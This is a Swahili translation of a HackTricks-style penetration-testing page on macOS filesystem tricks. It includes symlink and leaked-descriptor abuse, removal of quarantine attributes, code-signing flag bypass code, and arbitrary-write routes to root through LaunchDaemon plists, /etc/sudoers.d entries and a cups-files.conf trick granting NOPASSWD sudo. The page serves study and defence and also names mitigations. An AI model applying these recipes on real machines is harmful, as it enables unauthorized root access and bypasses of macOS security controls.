# Mbinu za FS za macOS

{{#include ../../../../banners/hacktricks-training.md}}

## Mchanganyiko wa ruhusa za POSIX

Kwa **saraka**, biti tatu za ruhusa zina maana tofauti na zinavyomaanisha kwenye faili ya kawaida. `chmod(1)` huita biti ya execute "**search**" inapotumika kwenye saraka:<sup>[[2]](#references)</sup>

> `0100` Kwa faili, huruhusu mmiliki kutekeleza. Kwa saraka, huruhusu mmiliki **kutafuta** ndani ya saraka.

- **read** - unaweza **kuorodhesha** maingizo ya saraka (kuonyesha majina).
- **write** - unaweza **kuunda, kubadilisha jina na kufuta maingizo** kwenye saraka. Kumbuka kuwa hili ni sifa ya saraka *inayozunguka* faili, si ya faili: unaweza kufuta faili ambayo huwezi kuisoma au kuiandikia, mradi tu uweze kuandika kwenye saraka yake mama.
  - Ili kufuta **saraka ndogo**, lazima iwe tupu, jambo ambalo linahitaji haki za kutosha kuondoa kila kitu kilicho ndani yake.
  - Ikiwa saraka ina **sticky bit** (`S_ISVTX`, kama `/tmp`), hili linawekewa kizuizi — POSIX inasema mchakato unaweza tu kufuta au kubadilisha majina ya faili humo ikiwa unamiliki faili, unamiliki saraka, au una privileges zinazofaa.<sup>[[1]](#references)</sup>
- **execute / search** - **unaruhusiwa kupita** kwenye saraka. Pathname resolution hupata kila kipengele "kwenye saraka iliyotajwa na kilichotangulia", kwa hiyo **kupoteza haki za search kwenye kipengele chochote kimoja cha prefix ya path hufanya kila kitu kilicho chini yake kisiweze kufikiwa kwa kutumia path**, hata kama faili ya mwisho inasomeka na kila mtu.<sup>[[1]](#references)</sup>

### Mchanganyiko Hatari

**Jinsi ya kubadilisha faili/folda inayomilikiwa na root**, lakini:

- **Mmiliki** wa **saraka** moja mama kwenye path ni mtumiaji
- **Mmiliki** wa **saraka** moja mama kwenye path ni **kikundi cha watumiaji** chenye **write access**
- **Kikundi** cha watumiaji kina **write access** kwenye **faili**

Kwa mchanganyiko wowote kati ya uliotajwa hapo juu, attacker anaweza **kuingiza** **sym/hard link** kwenye path inayotarajiwa ili kupata arbitrary write yenye privileges.

### Kisa maalum cha saraka ya root R+X

Hili linafuata moja kwa moja kutoka kwenye kanuni ya pathname resolution iliyoelezwa hapo juu. Ikiwa **saraka inaruhusu R+X kwa root pekee**, faili zilizo ndani yake haziwezi kufikiwa *kwa path* na mtu mwingine yeyote — lakini **biti za ruhusa za faili zenyewe bado zinaweza kuruhusu ufikiaji mpana**. Saraka ndiyo kizuizi pekee.

Kwa hiyo primitive yoyote inayokuwezesha kutoa faili **nje ya saraka hiyo** — mchakato wenye privileges unao **hamisha/kubadilisha jina/kunakili** path iliyochaguliwa na attacker hadi eneo ambalo *unaweza* kupita — hugeuka kuwa arbitrary read, bila kuhitaji kushinda mode ya faili yenyewe:

```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```

Tafuta programu zinazohamisha faili zenye haki za juu (visakinishi, programu za kuzungusha logi, wakusanyaji wa crash/diagnostic, vipengele vya kuhifadhi nakala na “export”) ambazo hupokea njia ya chanzo kutoka kwa mtumiaji mwenye haki za chini.

## Symbolic Link / Hard Link

### Faili/folda zinazoruhusu mabadiliko

Ikiwa mchakato wenye haki za juu unaandika data kwenye **faili** ambayo inaweza **kudhibitiwa** na **mtumiaji mwenye haki za chini**, au ambayo **iliwahi kuundwa** na mtumiaji mwenye haki za chini, mtumiaji huyo anaweza tu **kuielekeza kwenye faili nyingine** kupitia Symbolic au Hard link, na mchakato wenye haki za juu utaandika kwenye faili hiyo.

Angalia sehemu nyingine ambako mshambuliaji anaweza **kutumia vibaya uwezo wa kuandika kiholela ili kuongeza haki**.

### Fungua kwa `O_NOFOLLOW`

Kulingana na [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"Ikiwa `O_NOFOLLOW` imetumika kwenye mask na faili lengwa lililopitishwa kwa `open()` ni symbolic link, basi `open()` itashindwa."* Ni sehemu ya **mwisho** pekee inayokaguliwa — kila sehemu **ya kati** bado hutatuliwa na kufuatwa. Kwa hivyo, msanidi anayejaribu "kulinda" uandishi kwa `O_NOFOLLOW` bado anaweza kushambuliwa kwa kuweka symlink kwenye saraka yoyote ya **mzazi** ya njia lengwa.<sup>[[3]](#references)</sup>

Ukurasa huo huo wa man inaeleza flags zinazoziba pengo hilo:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"ikiwa ... sehemu yoyote ya njia iliyopitishwa kwa `open()` ni symbolic link, basi `open()` itashindwa."*
- **`O_RESOLVE_BENEATH`** — *"ikiwa ... utatuzi wa njia iliyobainishwa unatoka nje ya saraka inayohusishwa na fd, basi `openat()` itashindwa."*

Vinginevyo, kutumia `openat()` kulingana na directory FD ambayo tayari umeithibitisha, au kutumia `realpath()` kisha kuthibitisha tena, ndizo njia zilizobaki za kuzuia ubadilishaji wa symlink katikati ya njia.

## .fileloc

Faili zenye kiendelezi cha **`.fileloc`** zinaweza kuelekeza kwenye programu au binary nyingine, hivyo zinapofunguliwa, programu/binary hiyo ndiyo itakayotekelezwa.\
Mfano:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>URL</key>
    <string>file:///System/Applications/Calculator.app</string>
    <key>URLPrefix</key>
    <integer>0</integer>
</dict>
</plist>
```

## Vishikio vya Faili

### Leak FD (bila `O_CLOEXEC`)

Ikiwa mwito wa `open` hauna bendera `O_CLOEXEC`, descriptor ya faili itarithiwa na mchakato mtoto. Kwa hiyo, mchakato wenye haki za juu ukifungua faili yenye haki za juu na kutekeleza mchakato unaodhibitiwa na mshambulizi, mshambulizi **atarithi FD ya faili yenye haki za juu**.

Mfano maarufu ni **`DYLD_PRINT_TO_FILE` LPE katika OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` ilikubali `DYLD_PRINT_TO_FILE=/path` hata kwenye **binary zilizozuiliwa (suid root)**, kwa sababu kigezo hicho kilichanganuliwa nje ya `processDyldEnvironmentVariable()`.
- Ilitekeleza `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, kwa hiyo **iliunda faili inayomilikiwa na root kwenye njia yoyote**.
- FD **haikufungwa kamwe wala haikuwa na bendera ya close-on-exec**, kwa hiyo kila mchakato mtoto wa binary ya suid ulirithi **FD inayoweza kuandikia faili inayomilikiwa na root**.
- Kuendesha, kwa mfano, `DYLD_PRINT_TO_FILE=/etc/target suid_binary` kisha kusoma nambari ya FD iliyorithiwa kwenye mchakato mtoto kuliruhusu kuandika chochote kwenye faili zinazomilikiwa na root; `fcntl(fd, F_SETFL, 0)` hata iliondoa `O_APPEND` ili kuruhusu kubadilisha yaliyomo badala ya kuongezea.

Muundo huohuo hujitokeza kila mchakato wenye haki za juu unapofungua faili **kabla** ya kutekeleza kitu unachokidhibiti (zana saidizi, vihariri vya mtindo wa `crontab` vinavyoitwa kupitia `$EDITOR`, faili za logi/debug zinazofunguliwa kwa njia iliyotolewa kupitia env var...). Orodhesha FD ulizorithi kwa kutumia:

```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```

Chochote kilicho juu ya `2` kinachoelekeza kwenye faili ambalo huwezi kulifungua mwenyewe ni primitive ya arbitrary-write (au arbitrary-read).

## Epuka mbinu za quarantine xattrs

### Iondoe

```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```

### alama ya uchg / uchange / uimmutable

Ikiwa faili/folda ina sifa hii ya kutobadilika, haitawezekana kuiwekea xattr

```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```

### Mifumo ya faili isiyoauni xattr

Si kila mfumo wa faili ambao macOS inaweza kuunganisha huhifadhi **extended attributes** kiasili. HFS+ na APFS hufanya hivyo; **FAT32, exFAT na (mount nyingi za) NFS hazifanyi hivyo** — macOS huziiga kwa kuandika faili saidizi ya **AppleDouble** inayoitwa `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Hili ni muhimu kwa quarantine, kwa sababu xattr hudumu tu ikiwa inaweza kuandikwa **na kusomwa tena** kutoka kwenye volume hiyo hiyo:

```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```

Ikiwa volume itasomwa baadaye kupitia path inayopuuza companion `._` (au companion hiyo ikaondolewa/kufutwa), faili itafika **bila quarantine flag** — na `.app` isiyo na quarantine flag inatosha kukwepa App Sandbox, kama ilivyoelezwa katika [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL na tabia ya AppleDouble quarantine

Kwa mfano wa `writeextattr` ACL, utaratibu wa AppleDouble `com.apple.acl.text`, na hatua za kuunda na kuthibitisha sidecar, angalia [AppleDouble/ACL quarantine bypass reproduction](macos-appledouble-acl-quarantine-bypass.md).

## Bypass ukaguzi wa signature

### Bypass ukaguzi wa platform binaries

Baadhi ya ukaguzi wa usalama huthibitisha kama binary ni **platform binary**, kwa mfano ili kuruhusu kuunganishwa na XPC service. Hata hivyo, kama ilivyoonyeshwa katika chapisho kuhusu bypass katika https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, inawezekana kukwepa ukaguzi huu kwa kupata platform binary (kama `/bin/ls`) na kuingiza exploit kupitia dyld kwa kutumia environment variable `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>

### Bypass flags `CS_REQUIRE_LV` na `CS_FORCED_LV`

Binary inayotekelezwa inaweza kurekebisha flags zake yenyewe ili kukwepa ukaguzi, kwa kutumia code kama hii:<sup>[[7]](#references)</sup>

```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```



## Kukwepa Code Signatures

Bundles zina faili **`_CodeSignature/CodeResources`** ambalo lina **hash** ya kila **faili** moja ndani ya **bundle**. Kumbuka kuwa hash ya CodeResources pia **imepachikwa ndani ya executable**, kwa hiyo hatuwezi kuibadilisha pia.

Hata hivyo, kuna baadhi ya faili ambazo signature yake haitakaguliwa. Faili hizi zina key `omit` kwenye plist, kama vile:

```xml
<dict>
...
	<key>rules</key>
	<dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
	</dict>
	<key>rules2</key>
...
		<key>^(.*/index.html)?\.DS_Store$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>2000</real>
		</dict>
...
		<key>^PkgInfo$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>20</real>
		</dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
</dict>
```

Inawezekana kukokotoa signature ya resource kupitia cli kwa kutumia:

```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```

## Ku-mount dmgs

Mtumiaji anaweza ku-mount dmg maalum, hata juu ya baadhi ya folda zilizopo. Hivi ndivyo unavyoweza kuunda kifurushi maalum cha dmg chenye maudhui maalum:

```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```

Kwa kawaida, macOS huweka disk kwa kuwasiliana na huduma ya Mach `com.apple.DiskArbitrarion.diskarbitrariond` (inayotolewa na `/usr/libexec/diskarbitrationd`). Ukiongeza parameta `-d` kwenye faili ya plist ya LaunchDaemons na kuianzisha upya, itahifadhi kumbukumbu kwenye `/var/log/diskarbitrationd.log`; itahifadhi kumbukumbu kwenye `/var/log/diskarbitrationd.log`.\
Hata hivyo, inawezekana kutumia zana kama `hdik` na `hdiutil` kuwasiliana moja kwa moja na kext ya `com.apple.driver.DiskImages`.

## Uandishi Holela

### Skripti za sh za Kila Mara

Ikiwa skripti yako inaweza kutafsiriwa kama **skripti ya shell**, unaweza kubatilisha skripti ya shell **`/etc/periodic/daily/999.local`**, ambayo itaendeshwa kila siku.

Unaweza **kuiga** utekelezaji wa skripti hii kwa kutumia: **`sudo periodic daily`**

### Daemons

Andika **LaunchDaemon** holela kama **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** yenye plist inayotekeleza skripti yoyote kama:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.sample.Load</string>
        <key>ProgramArguments</key>
        <array>
            <string>/Applications/Scripts/privesc.sh</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
    </dict>
</plist>
```

Tengeneza tu script `/Applications/Scripts/privesc.sh` yenye **commands** unazotaka kuendesha kama root.

### Sudoers File

Ukiwa na **arbitrary write**, unaweza kuunda faili ndani ya folda **`/etc/sudoers.d/`** ili kujipa ruhusa za **sudo**.

### PATH files

Faili **`/etc/paths`** ni mojawapo ya sehemu kuu zinazojaza kigezo cha mazingira cha PATH. Lazima uwe root ili kulibadilisha, lakini ikiwa script kutoka kwa **privileged process** inaendesha **command bila path kamili**, huenda ukaweza **hijack** command hiyo kwa kurekebisha faili hili.

Unaweza pia kuandika faili ndani ya **`/etc/paths.d`** ili kuongeza folda mpya kwenye kigezo cha mazingira cha `PATH`.

### cups-files.conf

Mbinu hii ilitumika katika [writeup hii](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>

Unda faili `/etc/cups/cups-files.conf` yenye maudhui yafuatayo:

```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```

Hii itaunda faili `/etc/sudoers.d/lpe` lenye ruhusa 777. Maandishi ya ziada mwishoni yanalenga kuchochea uundaji wa kumbukumbu ya hitilafu.

Kisha, andika usanidi unaohitajika kwenye `/etc/sudoers.d/lpe` ili kuongeza upendeleo kama `%staff ALL=(ALL) NOPASSWD:ALL`.

Kisha, rekebisha tena faili `/etc/cups/cups-files.conf` kwa kuweka `LogFilePerm 700` ili faili mpya ya sudoers iwe halali unapoiita `cupsctl`.

### Sandbox Escape

Inawezekana kukwepa macOS sandbox kwa kutumia FS arbitrary write. Kwa mifano kadhaa, angalia ukurasa wa [macOS Auto Start](../../../../macos-auto-start-locations.md), lakini njia ya kawaida ni kuandika faili ya mapendeleo ya Terminal kwenye `~/Library/Preferences/com.apple.Terminal.plist` ambayo huendesha amri wakati wa kuwasha, kisha kuiita kwa kutumia `open`.

## Tengeneza faili zinazoweza kuandikwa kama watumiaji wengine

Njia ya kawaida sana ya privesc ni **kufanya mchakato wenye upendeleo ukuundie faili** kwenye saraka unayoidhibiti, kisha kubaki na **ruhusa ya kuandika** kwenye faili hiyo. Unahitaji vitu viwili:

1. Saraka unayomiliki (au ambapo unaweza kuweka **inheritable ACL**), ili chochote kitakachoundwa ndani yake kirithi ruhusa zako.
2. Mchakato wenye upendeleo/`suid` unaoweza kuelekezwa **mahali** pa kuunda faili — kwa kawaida kupitia kigezo cha mazingira cha utatuzi/ukusanyaji wa kumbukumbu, faili ya usanidi au XPC API ya helper.

Sehemu ya **inheritable ACL** ndiyo inayokuwezesha kuandika kwenye faili iliyoundwa hata ingawa inamilikiwa na mtumiaji mwingine. Alama za urithishaji za `file_inherit` / `directory_inherit` zimefafanuliwa kwenye [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):<sup>[[2]](#references)</sup>

```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```

Sasa faili yoyote ambayo mchakato wenye ruhusa za juu huunda ndani ya `$DIRNAME` **unaweza kuiandika**. Ikiwa saraka hiyo pia ni eneo ambalo baadaye **hutekelezwa kama root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, saraka ya LaunchDaemon...), hii ni njia ya moja kwa moja ya kuongeza ruhusa hadi root. Tazama sehemu za [Sudoers File](#sudoers-file) na [cups-files.conf](#cups-filesconf) hapo juu ili kuona cha kuandika ukishapata faili hiyo.

Kwa mfano kamili unaoonyesha mfuatano wa "kigezo cha mazingira husababisha mchakato wa root kuunda faili, na FD huvuja kwako", tazama [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) hapo juu.

## Kumbukumbu ya Pamoja ya POSIX

**Kumbukumbu ya pamoja ya POSIX** huruhusu michakato katika mifumo ya uendeshaji inayotii POSIX kufikia eneo la kumbukumbu la pamoja, na hivyo kuwezesha mawasiliano ya haraka zaidi ikilinganishwa na mbinu nyingine za mawasiliano kati ya michakato. Hii huhusisha kuunda au kufungua kipengee cha kumbukumbu ya pamoja kwa kutumia `shm_open()`, kuweka ukubwa wake kwa `ftruncate()`, na kukiweka kwenye nafasi ya anwani ya mchakato kwa kutumia `mmap()`. Kisha michakato inaweza kusoma na kuandika moja kwa moja kwenye eneo hili la kumbukumbu. Ili kudhibiti ufikiaji wa wakati mmoja na kuzuia uharibifu wa data, mara nyingi hutumika mbinu za kusawazisha kama vile mutex au semaphore. Hatimaye, michakato huondoa ramani ya kumbukumbu ya pamoja na kuifunga kwa kutumia `munmap()` na `close()`, na kwa hiari huondoa kipengee cha kumbukumbu kwa kutumia `shm_unlink()`. Mfumo huu hufaa hasa kwa IPC yenye ufanisi na ya kasi katika mazingira ambamo michakato mingi inahitaji kufikia data ya pamoja kwa haraka.

<details>

<summary>Mfano wa Msimbo wa Producer</summary>

```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Create the shared memory object
    int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Configure the size of the shared memory object
    if (ftruncate(shm_fd, SIZE) == -1) {
        perror("ftruncate");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Write to the shared memory
    sprintf(ptr, "Hello from Producer!");

    // Unmap and close, but do not unlink
    munmap(ptr, SIZE);
    close(shm_fd);

    return 0;
}
```

</details>

<details>

<summary>Mfano wa Msimbo wa Mtumiaji</summary>

```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Open the shared memory object
    int shm_fd = shm_open(name, O_RDONLY, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Read from the shared memory
    printf("Consumer received: %s\n", (char *)ptr);

    // Cleanup
    munmap(ptr, SIZE);
    close(shm_fd);
    shm_unlink(name); // Optionally unlink

    return 0;
}

```

</details>

## macOS Guarded Descriptors

**macOS guarded descriptors** ni kipengele cha usalama kilicholetwa kwenye macOS ili kuongeza usalama na uthabiti wa **file descriptor operations** katika programu za watumiaji. Guarded descriptors hizi hutoa njia ya kuhusisha vizuizi maalum au "guards" na file descriptors, ambavyo hutekelezwa na kernel.

Kipengele hiki ni muhimu hasa katika kuzuia aina fulani za udhaifu wa usalama kama vile **ufikiaji wa faili bila idhini** au **race conditions**. Udhaifu huu hutokea, kwa mfano, thread inapofikia maelezo ya faili na hivyo kumpa **thread nyingine iliyo hatarini ufikiaji wake**, au file descriptor **inaporithishwa** kwa child process iliyo hatarini. Baadhi ya functions zinazohusiana na utendaji huu ni:

- `guarded_open_np`: Hufungua file descriptor ikiwa na guard
- `guarded_close_np`: Hufunga file descriptor hiyo
- `change_fdguard_np`: Hubadilisha alama za guard kwenye descriptor (hata kuondoa ulinzi wa guard)

## References

- [1] [POSIX.1-2024 — Ufafanuzi wa Msingi, Sura ya 4 (Ruhusa za Ufikiaji wa Faili, Ulinzi wa Saraka, Utatuzi wa Pathname)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` ukurasa wa man](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` ukurasa wa man](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - Kuongeza Ruhusa za Ndani kupitia DYLD_PRINT_TO_FILE katika OS X 10.10](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Ni mifumo gani ya faili na huduma za cloud huhifadhi sifa zilizopanuliwa?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [7] [Mickey (Jhftss) - Enzi Mpya ya Kutoroka kutoka macOS Sandbox](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Kufichua Udhaifu wa Apple: Hadithi ya Ukaguzi wa diskarbitrationd na storagekitd, Sehemu ya 1](https://www.kandji.io/blog/macos-audit-story-part1)
{{#include ../../../../banners/hacktricks-training.md}}
